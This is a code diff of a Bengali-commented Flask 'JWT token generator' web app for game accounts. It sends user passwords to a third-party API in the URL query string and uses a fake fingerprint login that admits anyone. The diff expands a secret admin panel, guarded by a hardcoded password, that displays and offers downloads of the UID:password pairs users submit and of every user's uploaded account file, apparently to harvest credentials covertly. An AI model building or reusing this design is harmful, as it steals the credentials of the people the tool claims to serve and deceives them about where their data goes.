@@ -3,7 +3,9 @@ import urllib.parse
 import base64
 import json
 import os
-from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
+import uuid  # প্রতিটি ইউজারের জন্য ইউনিক আইডি তৈরি করতে
+import time  # ক্যাশ বুস্টিং বা ইউনিক টাইমস্ট্যাম্পের জন্য
+from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_from_directory
 import aiohttp
 from datetime import datetime
 from apscheduler.schedulers.background import BackgroundScheduler
@@ -17,11 +19,18 @@ ADMIN_DATA_FOLDER = 'admin_database'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs(ADMIN_DATA_FOLDER, exist_ok=True)
 
-SAVED_FILE_PATH = os.path.join(UPLOAD_FOLDER, 'active_accounts.txt')
+# মূল এডমিন ফাইল যা আগের মতোই থাকবে
 CREDENTIALS_LOG_PATH = os.path.join(ADMIN_DATA_FOLDER, 'stored_credentials.txt')
 
 # অ্যাডমিন প্যানেল অ্যাক্সেস পাসওয়ার্ড
 ADMIN_PASSWORD = "Yasin123"
+
+# প্রতিটা ইউজারের জন্য আলাদা ফাইল পাথ জেনারেট করার ফাংশন
+def get_user_file_path():
+    if 'user_file_id' not in session:
+        session['user_file_id'] = str(uuid.uuid4())[:8]  # ইউজারের জন্য একটি ইউনিক আইডি
+    filename = f"active_accounts_{session['user_file_id']}.txt"
+    return os.path.join(UPLOAD_FOLDER, filename), filename
 
 # Linie থেকে শুধুমাত্র গাণিতিক UID যাচাই করার হেল্পার ফাংশন
 def count_valid_accounts(file_path):
@@ -46,34 +55,52 @@ def count_valid_accounts(file_path):
         pass
     return valid_count
 
-# অটোমেশনের গ্লোবাল স্টেট ট্র্যাকিং
-initial_count = count_valid_accounts(SAVED_FILE_PATH)
-initial_file_name = "active_accounts.txt" if initial_count > 0 else "None"
-
+# অটোমেশনের গ্লোবাল স্টেক ট্র্যাকিং
 scheduler = BackgroundScheduler()
 scheduler.start()
-auto_status = {
-    "running": False, 
-    "interval": 0, 
-    "last_token": "None", 
-    "last_update": "Never", 
-    "error": "None", 
-    "next_run_timestamp": 0,
-    "total_accounts_loaded": initial_count,
-    "current_file_name": initial_file_name,
-    "total_uploaded_tokens": 0,       
-    "failed_lines": "None"            
-}
+
+# প্রতিটি ইউজারের স্ট্যাটাস আলাদা রাখার জন্য গ্লোবাল ডিকশনারি
+user_auto_status = {}
+
+def get_user_status_dict(user_id):
+    """ইউজারের আইডি অনুযায়ী তার নিজস্ব স্ট্যাটাস ডাটা রিটার্ন বা ইনিশিয়ালাইজ করবে"""
+    if user_id not in user_auto_status:
+        user_auto_status[user_id] = {
+            "running": False, 
+            "interval": 0, 
+            "last_token": "None", 
+            "last_update": "Never", 
+            "error": "None", 
+            "next_run_timestamp": 0,
+            "total_accounts_loaded": 0,
+            "current_file_name": "None",
+            "total_uploaded_tokens": 0,       
+            "failed_lines": "None",
+            "current_generating_count": 0  # লাইভ টোকেন জেনারেট কাউন্টার
+        }
+    return user_auto_status[user_id]
 
 # --- টোকেন জেনারেটর ফাংশন ---
-async def generate_jwt_token(uid, password):
-    """Generate JWT token"""
+async def generate_jwt_token(uid, password, http_session=None):
+    """Generate Fresh JWT token by bypassing any internal cache"""
     try:
         encoded_password = urllib.parse.quote(password)
-        url = f"https://ff-jwt-gen-api.lovable.app/api/public/token?uid={uid}&password={encoded_password}"
+        cache_buster = int(time.time() * 1000)
+        url = f"https://ff-jwt-gen-api.lovable.app/api/public/token?uid={uid}&password={encoded_password}&_cb={cache_buster}"
         
-        async with aiohttp.ClientSession() as session_http:
-            async with session_http.get(url, timeout=24) as response:
+        close_session = False
+        if http_session is None:
+            http_session = aiohttp.ClientSession()
+            close_session = True
+            
+        headers = {
+            "Cache-Control": "no-cache, no-store, must-revalidate",
+            "Pragma": "no-cache",
+            "Expires": "0"
+        }
+        
+        try:
+            async with http_session.get(url, headers=headers, timeout=15) as response:
                 if response.status == 200:
                     data = await response.json()
                     if isinstance(data, dict):
@@ -82,6 +109,9 @@ async def generate_jwt_token(uid, password):
                         elif 'token' in data:
                             return data['token']
                 return None
+        finally:
+            if close_session:
+                await http_session.close()
     except:
         return None
 
@@ -117,9 +147,12 @@ async def upload_tokens_to_github(tokens_list, github_token, repo, file_path):
             return put_resp.status in [200, 201]
 
 # --- ক্রন জব বা অটো টাস্ক ---
-def auto_token_job(github_token, repo, file_path, saved_file_path):
+def auto_token_job(github_token, repo, file_path, saved_file_path, user_id):
+    status_obj = get_user_status_dict(user_id)
+    status_obj["current_generating_count"] = 0
+
     if not os.path.exists(saved_file_path):
-        auto_status["error"] = "Uploaded account file missing."
+        status_obj["error"] = "Uploaded account file missing."
         return
 
     tokens_to_upload = []
@@ -129,9 +162,18 @@ def auto_token_job(github_token, repo, file_path, saved_file_path):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
-    try:
-        with open(saved_file_path, 'r', encoding='utf-8') as f:
-            lines = f.readlines()
+    async def process_all_accounts():
+        nonlocal success_count
+        try:
+            with open(saved_file_path, 'r', encoding='utf-8') as f:
+                lines = f.readlines()
+        except Exception as e:
+            status_obj["error"] = f"File processing error: {str(e)}"
+            return
+
+        async with aiohttp.ClientSession() as http_session:
+            tasks = []
+            line_meta = []
             
             for index, raw_line in enumerate(lines, start=1):
                 line = raw_line.strip()
@@ -147,47 +189,52 @@ def auto_token_job(github_token, repo, file_path, saved_file_path):
                 if uid and password:
                     uid = uid.strip()
                     password = password.strip()
-                    
-                    token = loop.run_until_complete(generate_jwt_token(uid, password))
-                    
-                    if token:
-                        tokens_to_upload.append({
-                            "uid": uid,
-                            "token": token,
-                            "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                        })
-                        auto_status["last_token"] = token[:20] + "..." + token[-10:]
-                        success_count += 1
-                    else:
-                        failed_lines_list.append(str(index))
+                    tasks.append(generate_jwt_token(uid, password, http_session))
+                    line_meta.append({"index": index, "uid": uid})
                 else:
                     failed_lines_list.append(str(index))
+
+            if tasks:
+                for future in asyncio.as_completed(tasks):
+                    token = await future
+                    status_obj["current_generating_count"] += 1
                     
-    except Exception as e:
-        auto_status["error"] = f"File processing error: {str(e)}"
-        loop.close()
-        return
+                    current_idx = status_obj["current_generating_count"] - 1
+                    if current_idx < len(line_meta):
+                        meta = line_meta[current_idx]
+                        if token:
+                            tokens_to_upload.append({
+                                "uid": meta["uid"],
+                                "token": token,
+                                "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                            })
+                            status_obj["last_token"] = token[:20] + "..." + token[-10:]
+                            success_count += 1
+                        else:
+                            failed_lines_list.append(str(meta["index"]))
+
+    loop.run_until_complete(process_all_accounts())
 
     if failed_lines_list:
-        auto_status["failed_lines"] = ", ".join(failed_lines_list)
+        status_obj["failed_lines"] = ", ".join(failed_lines_list)
     else:
-        auto_status["failed_lines"] = "None"
+        status_obj["failed_lines"] = "None"
 
     if tokens_to_upload:
         success = loop.run_until_complete(upload_tokens_to_github(tokens_to_upload, github_token, repo, file_path))
         current_time = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
         
         if success:
-            auto_status["last_update"] = current_time
-            auto_status["total_uploaded_tokens"] = success_count
-            auto_status["error"] = "None"
-            auto_status["next_run_timestamp"] = int(datetime.now().timestamp()) + (auto_status["interval"] * 60)
+            status_obj["last_update"] = current_time
+            status_obj["total_uploaded_tokens"] = success_count
+            status_obj["error"] = "None"
+            status_obj["next_run_timestamp"] = int(datetime.now().timestamp()) + (status_obj["interval"] * 60)
         else:
-            auto_status["error"] = "GitHub upload failed. Check Token/Repo/Path."
-            auto_status["total_uploaded_tokens"] = 0
+            status_obj["error"] = "GitHub upload failed. Check Token/Repo/Path."
+            status_obj["total_uploaded_tokens"] = 0
     else:
-        auto_status["error"] = "All uploaded accounts failed to generate tokens."
-        auto_status["total_uploaded_tokens"] = 0
+        status_obj["error"] = "All uploaded accounts failed to generate tokens."
+        status_obj["total_uploaded_tokens"] = 0
         
     loop.close()
 
@@ -230,8 +277,6 @@ LOGIN_TEMPLATE = """
             font-size: 2rem;
             letter-spacing: 1px;
         }
-        
-        /* ফিঙ্গারপ্রিন্ট বাটন এবং অ্যানিমেশন স্টাইল */
         .fingerprint-wrapper {
             position: relative;
             width: 120px;
@@ -257,8 +302,6 @@ LOGIN_TEMPLATE = """
             fill: #38bdf8;
             transition: all 0.2s ease;
         }
-        
-        /* স্ক্যানিং এফেক্ট লাইন */
         .scan-line {
             position: absolute;
             top: 0;
@@ -271,8 +314,6 @@ LOGIN_TEMPLATE = """
             opacity: 0;
             transform: translateY(0);
         }
-        
-        /* অ্যাক্টিভ ক্লাস যখন ইউজার টাচ/ক্লিক করবে - গতি ও অ্যানিমেশন বাড়ানো হয়েছে */
         .fingerprint-wrapper.scanning .fingerprint-btn {
             border-color: #ec4899;
             box-shadow: 0 0 30px rgba(236, 72, 153, 0.6);
@@ -286,13 +327,11 @@ LOGIN_TEMPLATE = """
             opacity: 1;
             animation: scanMove 0.4s ease-in-out infinite;
         }
-        
         @keyframes scanMove {
             0% { transform: translateY(10px); }
             50% { transform: translateY(110px); }
             100% { transform: translateY(10px); }
         }
-        
         .status-text {
             font-weight: 600;
             font-size: 0.95rem;
@@ -306,11 +345,9 @@ LOGIN_TEMPLATE = """
     </style>
 </head>
 <body>
-
     <div class="login-box">
         <h1 class="bot-title mb-2">JWT TOKEN GENERATE BOT</h1>
         <p class="text-muted small">Hold or click fingerprint sensor to unlock system dashboard</p>
-        
         <div class="fingerprint-wrapper" id="fingerAuthBlock">
             <div class="scan-line"></div>
             <div class="fingerprint-btn">
@@ -319,19 +356,15 @@ LOGIN_TEMPLATE = """
                 </svg>
             </div>
         </div>
-        
         <div class="status-text" id="statusLabel">SCAN ANY FINGER TO ENTER</div>
     </div>
-
     <script>
         const fingerBlock = document.getElementById('fingerAuthBlock');
         const statusLabel = document.getElementById('statusLabel');
-
         fingerBlock.addEventListener('click', () => {
             fingerBlock.classList.add('scanning');
             statusLabel.innerText = "SCANNING BIOMETRICS...";
             statusLabel.classList.add('scanning-active-text');
-
             setTimeout(async () => {
                 try {
                     const response = await fetch('/api/biometric-login', { method: 'POST' });
@@ -339,9 +372,7 @@ LOGIN_TEMPLATE = """
                     if(data.success) {
                         statusLabel.innerText = "ACCESS GRANTED! REDIRECTING...";
                         statusLabel.style.color = "#10b981";
-                        setTimeout(() => {
-                            window.location.href = "/dashboard";
-                        }, 200);
+                        setTimeout(() => { window.location.href = "/dashboard"; }, 200);
                     }
                 } catch {
                     statusLabel.innerText = "AUTHENTICATION ERROR!";
@@ -355,7 +386,6 @@ LOGIN_TEMPLATE = """
 """
 
 # --- ফ্রন্টএন্ড ডিজাইন (Dashboard) ---
-# লগ আউট বাটনটিকে একদম ডানদিকের কোণায় স্থায়ী পজিশনে রাখা হয়েছে
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -378,15 +408,7 @@ HTML_TEMPLATE = """
             font-weight: 800;
             text-shadow: 0 0 40px rgba(168, 85, 247, 0.2);
         }
-        
-        /* লগ আউট বোতামটিকে একদম ডানদিকের কোণায় (Right Corner) ফিক্সড পজিশন দেওয়া হয়েছে */
-        .logout-btn-custom {
-            position: absolute;
-            top: 0px; 
-            right: 15px;
-            z-index: 1000;
-        }
-        
+        .logout-btn-custom { position: absolute; top: 0px; right: 15px; z-index: 1000; }
         .card { 
             border: 1px solid rgba(168, 85, 247, 0.2); 
             background: rgba(15, 23, 42, 0.75);
@@ -395,12 +417,8 @@ HTML_TEMPLATE = """
             border-radius: 20px;
             transition: all 0.3s ease;
         }
-        .card:hover {
-            border-color: rgba(236, 72, 153, 0.4);
-            box-shadow: 0 0 30px rgba(236, 72, 153, 0.15);
-        }
+        .card:hover { border-color: rgba(236, 72, 153, 0.4); box-shadow: 0 0 30px rgba(236, 72, 153, 0.15); }
         .form-label { color: #e2e8f0; font-weight: 600; }
-        
         .form-control {
             background: rgba(2, 6, 23, 0.9);
             border: 1px solid rgba(255, 255, 255, 0.25);
@@ -408,48 +426,22 @@ HTML_TEMPLATE = """
             border-radius: 10px;
             font-weight: 500;
         }
-        .form-control::placeholder {
-            color: #adbac7 !important;
-            opacity: 1;
-            font-weight: bold;
-            font-size: 0.95rem;
-        }
-        .form-control:focus {
-            background: #020617;
-            border-color: #38bdf8;
-            color: #ffffff;
-            box-shadow: 0 0 12px rgba(56, 189, 248, 0.5);
-        }
-        
-        .btn-gradient-1 { 
-            background: linear-gradient(135deg, #ec4899 0%, #a855f7 100%); 
-            border: none; color: white; font-weight: bold; border-radius: 10px;
-        }
+        .form-control::placeholder { color: #adbac7 !important; opacity: 1; font-weight: bold; font-size: 0.95rem; }
+        .form-control:focus { background: #020617; border-color: #38bdf8; color: #ffffff; box-shadow: 0 0 12px rgba(56, 189, 248, 0.5); }
+        .btn-gradient-1 { background: linear-gradient(135deg, #ec4899 0%, #a855f7 100%); border: none; color: white; font-weight: bold; border-radius: 10px; }
         .btn-gradient-1:hover { background: linear-gradient(135deg, #db2777 0%, #9333ea 100%); opacity: 0.9; }
-        
-        .btn-gradient-2 { 
-            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%); 
-            border: none; color: white; font-weight: bold; border-radius: 10px;
-        }
+        .btn-gradient-2 { background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%); border: none; color: white; font-weight: bold; border-radius: 10px; }
         .btn-gradient-2:hover { background: linear-gradient(135deg, #0284c7 0%, #1d4ed8 100%); opacity: 0.9; }
-        
-        .btn-copy {
-            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
-            border: none; color: white; border-radius: 10px;
-        }
-        .status-badge {
-            padding: 6px 14px; border-radius: 50px; font-weight: bold; font-size: 0.85rem;
-        }
+        .btn-copy { background: linear-gradient(135deg, #10b981 0%, #059669 100%); border: none; color: white; border-radius: 10px; }
+        .status-badge { padding: 6px 14px; border-radius: 50px; font-weight: bold; font-size: 0.85rem; }
         .status-active { background-color: #10b981; color: white; animation: pulse 2s infinite; }
         .status-inactive { background-color: #ef4444; color: white; }
-        
         @keyframes pulse {
             0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
             70% { transform: scale(1.03); box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
             100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
         .verify-text { font-size: 0.85rem; font-weight: bold; }
-        
         .counter-box-slim {
             background: rgba(2, 6, 23, 0.7);
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -461,9 +453,47 @@ HTML_TEMPLATE = """
             height: 38px;
         }
         .counter-label { color: #94a3b8; font-size: 0.85rem; font-weight: 500; }
+
+        .toast-container-custom {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .cyber-toast {
+            background: rgba(15, 23, 42, 0.95);
+            border-left: 5px solid #38bdf8;
+            color: #ffffff;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 0 10px rgba(255,255,255,0.05);
+            font-weight: 600;
+            font-size: 0.95rem;
+            min-width: 280px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            animation: slideInRight 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            opacity: 0;
+        }
+        .cyber-toast.toast-start { border-left-color: #10b981; box-shadow: 0 0 20px rgba(16, 185, 129, 0.2); }
+        .cyber-toast.toast-stop { border-left-color: #ef4444; box-shadow: 0 0 20px rgba(239, 68, 68, 0.2); }
+        @keyframes slideInRight {
+            0% { transform: translateX(100%); opacity: 0; }
+            100% { transform: translateX(0); opacity: 1; }
+        }
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            100% { opacity: 0; transform: translateY(10px); }
+        }
     </style>
 </head>
 <body>
+    <div class="toast-container-custom" id="toastContainer"></div>
+
     <div class="container py-5 position-relative">
         <a href="/logout" class="btn btn-outline-danger btn-sm logout-btn-custom rounded-pill px-3 fw-bold">Log Out</a>
 
@@ -559,8 +589,11 @@ HTML_TEMPLATE = """
                         </div>
                         <small class="d-block text-secondary">TOTAL CORRECT TOKEN UPLOAD: <span id="totalUploadedTokens" class="text-success fw-bold">0</span></small>
                         <small class="d-block text-secondary">TOKEN UPLOAD FAILED (LINE NUMBER): <span id="failedLines" class="text-danger fw-bold">None</span></small>
+                        
+                        <small class="d-block text-secondary">NEW TOKEN GENERATOR: <span id="currentGenCount" class="text-warning fw-bold">0</span></small>
+                        
                         <small class="d-block text-secondary">NEW TOKEN PROCESSING: <span id="stToken" class="text-info">None</span></small>
-                        <small class="d-block text-secondary">LAST SYNC TIME: <span id="stTime" class="text-success">Never</span></small>
+                        <small class="d-block text-success">LAST SYNC TIME: <span id="stTime" class="text-success">Never</span></small>
                         <small class="d-block text-secondary">LIFETIME COUNTDOWN: <span id="lifetimeCountdown" class="text-warning fw-bold">00h 00m 00s remaining</span></small>
                         <small class="d-block text-danger">এরর লগ: <span id="stError">None</span></small>
                     </div>
@@ -572,6 +605,19 @@ HTML_TEMPLATE = """
     <script>
         let currentGitHubUsername = "";
         let globalTargetTimestamp = 0;
+
+        function showNotification(message, type) {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `cyber-toast toast-${type}`;
+            toast.innerHTML = `<span>${message}</span>`;
+            container.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.animation = "fadeOut 0.4s ease forwards";
+                setTimeout(() => { toast.remove(); }, 400);
+            }, 4000);
+        }
 
         window.addEventListener('DOMContentLoaded', () => {
             if(localStorage.getItem('ghToken')) {
@@ -688,17 +734,23 @@ HTML_TEMPLATE = """
             submitBtn.disabled = true;
             submitBtn.innerText = 'Connecting...';
             
+            const browser_cache_buster = Date.now();
+            
             try {
-                const response = await fetch('/api/get-token', {
+                const response = await fetch(`/api/get-token?_ts=${browser_cache_buster}`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache'
+                    },
                     body: JSON.stringify({ uid, password })
                 });
                 const data = await response.json();
                 if(data.success) {
                     document.getElementById('generatedToken').value = data.token;
                     document.getElementById('tokenResultBox').classList.remove('d-none');
-                } else { alert('ভুল ক্রেডেনশিয়াল!'); }
+                } else { alert('ভুল ক্রেডেনশিয়াল বা সার্ভার ত্রুটি!'); }
             } catch { alert('সার্ভার ত্রুটি!'); }
             finally {
                 submitBtn.disabled = false;
@@ -743,13 +795,19 @@ HTML_TEMPLATE = """
                 body: JSON.stringify(payload)
             });
             const data = await response.json();
-            if(data.success) { updateStatusBoard(); }
+            if(data.success) { 
+                updateStatusBoard(); 
+                showNotification("🚀 auto token generator start", "start");
+            }
         });
 
         document.getElementById('stopBtn').addEventListener('click', async () => {
             const response = await fetch('/api/auto-stop', { method: 'POST' });
             const data = await response.json();
-            if(data.success) { updateStatusBoard(); }
+            if(data.success) { 
+                updateStatusBoard(); 
+                showNotification("🛑 auto token generator stop", "stop");
+            }
         });
 
         function runLiveCountdown() {
@@ -793,14 +851,16 @@ HTML_TEMPLATE = """
             document.getElementById('stError').innerText = data.error;
             document.getElementById('totalAccountDisplay').innerText = data.total_accounts_loaded;
             document.getElementById('activeFileName').innerText = data.current_file_name;
-            
             document.getElementById('totalUploadedTokens').innerText = data.total_uploaded_tokens;
             document.getElementById('failedLines').innerText = data.failed_lines;
+            
+            document.getElementById('currentGenCount').innerText = data.current_generating_count;
+            
             runLiveCountdown();
         }
 
         setInterval(runLiveCountdown, 1000);
-        setInterval(updateStatusBoard, 5000);
+        setInterval(updateStatusBoard, 1000);
     </script>
 </body>
 </html>
@@ -838,71 +898,195 @@ ADMIN_LOGIN_TEMPLATE = """
 """
 
 # --- সিক্রেট ও প্রিমিয়াম অ্যাডমিন প্যানেল ডিজাইন ---
+# এখানে ভুল ট্যাগটি সংশোধন করা হয়েছে ({% for item in files_list %})
 ADMIN_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>🔒 Hellos Master Admin Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 Elite Cyber Space - Advanced Admin Portal</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background: #020617; color: #cbd5e1; font-family: 'Segoe UI', system-ui, sans-serif; }
-        .admin-card { background: rgba(30, 41, 59, 0.4); border: 1px solid #334155; border-radius: 16px; backdrop-filter: blur(10px); }
-        .table { color: #f8fafc; background: rgba(15, 23, 42, 0.6); }
-        .custom-badge { font-size: 0.85rem; padding: 5px 10px; border-radius: 6px; }
-        pre { background: #090d16; padding: 12px; border-radius: 8px; border: 1px solid #1e293b; color: #38bdf8; max-height: 250px; overflow-y: auto;}
+        body { 
+            background: radial-gradient(circle at top right, #1e1b4b 0%, #090d16 60%, #020617 100%);
+            color: #e2e8f0; 
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+        }
+        .navbar-custom {
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(15px);
+            border-bottom: 1px solid rgba(168, 85, 247, 0.2);
+            padding: 15px 20px;
+            border-radius: 0 0 20px 20px;
+        }
+        .admin-card { 
+            background: rgba(15, 23, 42, 0.45); 
+            border: 1px solid rgba(56, 189, 248, 0.15); 
+            border-radius: 24px; 
+            backdrop-filter: blur(20px);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.05);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .admin-card:hover {
+            border-color: rgba(168, 85, 247, 0.3);
+            box-shadow: 0 25px 60px rgba(168, 85, 247, 0.1);
+        }
+        .table { 
+            color: #f1f5f9; 
+            background: transparent;
+            border-collapse: separate;
+            border-spacing: 0 8px;
+        }
+        .table thead Th {
+            background: linear-gradient(90deg, #1e1b4b, #0f172a);
+            color: #a855f7;
+            font-weight: 700;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+            border: none;
+            padding: 15px;
+        }
+        .table tbody tr {
+            background: rgba(30, 41, 59, 0.3);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            border-radius: 10px;
+            transition: background 0.2s;
+        }
+        .table tbody tr:hover {
+            background: rgba(30, 41, 59, 0.6);
+        }
+        .table tbody td {
+            padding: 16px 15px;
+            border: none;
+            color: #cbd5e1;
+        }
+        .table tbody tr td:first-child { border-radius: 12px 0 0 12px; }
+        .table tbody tr td:last-child { border-radius: 0 12px 12px 0; }
+        
+        .custom-badge { 
+            font-size: 0.8rem; 
+            padding: 6px 14px; 
+            border-radius: 50px; 
+            font-weight: 600;
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(5, 150, 105, 0.2));
+            color: #34d399;
+            border: 1px solid rgba(52, 211, 153, 0.3);
+        }
+        pre { 
+            background: #020617; 
+            padding: 20px; 
+            border-radius: 16px; 
+            border: 1px solid rgba(236, 72, 153, 0.15); 
+            color: #38bdf8; 
+            max-height: 320px; 
+            overflow-y: auto;
+            font-family: 'Fira Code', Consolas, monospace;
+            box-shadow: inset 0 2px 8px rgba(0,0,0,0.8);
+        }
+        pre::-webkit-scrollbar { width: 8px; }
+        pre::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+        
+        .header-gradient {
+            background: linear-gradient(45deg, #38bdf8, #a855f7, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .btn-action {
+            background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
+            border: none;
+            color: #ffffff;
+            font-weight: 600;
+            padding: 8px 20px;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(168, 85, 247, 0.2);
+        }
+        .btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(168, 85, 247, 0.4);
+            color: #ffffff;
+            opacity: 0.95;
+        }
+        .btn-nav-outline {
+            border: 1px solid rgba(56, 189, 248, 0.4);
+            color: #38bdf8;
+            background: rgba(56, 189, 248, 0.05);
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        .btn-nav-outline:hover {
+            background: #38bdf8;
+            color: #020617;
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.4);
+        }
     </style>
 </head>
 <body>
-    <div class="container py-5">
-        <div class="d-flex justify-content-between align-items-center mb-4">
+    <div class="container">
+        <div class="navbar-custom d-flex justify-content-between align-items-center mt-3 mb-5 shadow-lg">
             <div>
-                <h2 class="text-danger fw-bold m-0">🕵️‍♂️ Hellos Security Admin Engine</h2>
-                <p class="text-muted small m-0">Real-time captured data management station</p>
+                <h3 class="header-gradient fw-bold m-0">🕵️‍♂️ Elite Cyber Security Panel</h3>
+                <p class="text-secondary small m-0">Automated Live Logs Monitoring Terminal</p>
             </div>
             <div class="d-flex gap-2">
-                <a href="/dashboard" class="btn btn-outline-info btn-sm px-4 rounded-pill">Back To Dashboard</a>
-                <a href="/hello-admin-logout" class="btn btn-danger btn-sm px-3 rounded-pill">Logout</a>
+                <a href="/dashboard" class="btn btn-nav-outline btn-sm px-4 rounded-pill">Back Dashboard</a>
+                <a href="/hello-admin-logout" class="btn btn-outline-danger btn-sm px-4 rounded-pill fw-bold">Logout Session</a>
             </div>
         </div>
         
         <div class="row g-4">
-            <div class="col-12">
-                <div class="admin-card p-4 shadow">
-                    <h4 class="text-warning fw-bold mb-3">📁 Uploaded Real-time Unique Account Database (.txt)</h4>
-                    <div class="table-responsive">
-                        <table class="table table-bordered table-hover align-middle">
-                            <thead class="table-dark">
-                                <tr>
-                                    <th>Database Stream Target</th>
-                                    <th>Total Merged Accounts</th>
-                                    <th>Raw Content View (Serial By Serial - No Duplicates)</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                {% if file_exists %}
-                                <tr>
-                                    <td class="text-info fw-bold">active_accounts.txt</td>
-                                    <td><span class="badge bg-success custom-badge">{{ total_count }} Accounts</span></td>
-                                    <td><pre>{{ file_preview }}</pre></td>
-                                </tr>
-                                {% else %}
-                                <tr>
-                                    <td colspan="3" class="text-center text-muted py-3">No text configuration files are currently uploaded.</td>
-                                </tr>
-                                {% endif %}
-                            </tbody>
-                        </table>
+            <div class="col-12 mb-2">
+                <div class="admin-card p-4">
+                    <div class="d-flex flex-column flex-sm-row justify-content-between align-items-start align-items-sm-center gap-3 mb-4">
+                        <div>
+                            <h4 class="text-info fw-bold m-0">🔑 Captured Manual Generator Logs</h4>
+                            <p class="text-muted small m-0">১ম বক্স থেকে সাবমিট করা ইউনিক আইডি এবং পাসওয়ার্ডের লাইভ তালিকা:</p>
+                        </div>
+                        <a href="/api/admin/download-manual" class="btn btn-action">Download credentials.txt</a>
+                    </div>
+                    <div class="p-1 bg-dark bg-opacity-50 rounded-4">
+                        <pre>{{ manual_credentials_data }}</pre>
                     </div>
                 </div>
             </div>
 
             <div class="col-12">
-                <div class="admin-card p-4 shadow">
-                    <h4 class="text-success fw-bold mb-3">🔑 Captured Manual Generator Credentials Logs</h4>
-                    <div class="p-3 bg-dark rounded border border-secondary">
-                        <label class="form-label text-info fw-bold mb-2">stored_credentials.txt Content (UID:PASS Format):</label>
-                        <pre style="color: #a855f7; font-size: 0.95rem;">{{ manual_credentials_data }}</pre>
+                <div class="admin-card p-4">
+                    <div>
+                        <h4 class="text-warning fw-bold m-0">📁 Live Active Sessions Database (.txt)</h4>
+                        <p class="text-muted small mb-4">ইউজারদের আলাদা সেশনে আপলোডকৃত ফাইলের রিয়েল-টাইম ডাটাবেস স্ট্রীম:</p>
+                    </div>
+                    <div class="table-responsive">
+                        <table class="table align-middle m-0">
+                            <thead>
+                                <tr>
+                                    <th>Target Data Stream (File Name)</th>
+                                    <th>Total Loaded Serials</th>
+                                    <th class="text-center" style="width: 160px;">Action Link</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% if files_list %}
+                                    {% for item in files_list %}
+                                    <tr>
+                                        <td class="text-info fw-bold font-monospace" style="font-size:0.95rem;">{{ item.name }}</td>
+                                        <td><span class="custom-badge">{{ item.count }} Accounts Active</span></td>
+                                        <td class="text-center">
+                                            <a href="/api/admin/download-file/{{ item.name }}" class="btn btn-action py-1 px-3" style="font-size:0.8rem; border-radius:8px;">Download TXT</a>
+                                        </td>
+                                    </tr>
+                                    {% endfor %}
+                                {% else %}
+                                <tr>
+                                    <td colspan="3" class="text-center text-muted py-5 font-monospace">No configuration files are currently active in any user stream.</td>
+                                </tr>
+                                {% endif %}
+                            </tbody>
+                        </table>
                     </div>
                 </div>
             </div>
@@ -923,6 +1107,8 @@ def login_gate():
 @app.route('/api/biometric-login', methods=['POST'])
 def biometric_login():
     session['user_authenticated'] = True
+    if 'user_file_id' not in session:
+        session['user_file_id'] = str(uuid.uuid4())[:8]
     return jsonify({"success": True})
 
 @app.route('/logout')
@@ -941,16 +1127,15 @@ def admin_panel():
     if not session.get('admin_logged_in'):
         return render_template_string(ADMIN_LOGIN_TEMPLATE, error=None)
         
-    file_exists = os.path.exists(SAVED_FILE_PATH)
-    file_preview = "Empty File"
-    total_count = 0
-    if file_exists:
-        try:
-            with open(SAVED_FILE_PATH, 'r', encoding='utf-8') as f:
-                file_preview = f.read()
-            total_count = count_valid_accounts(SAVED_FILE_PATH)
-        except:
-            pass
+    all_files = []
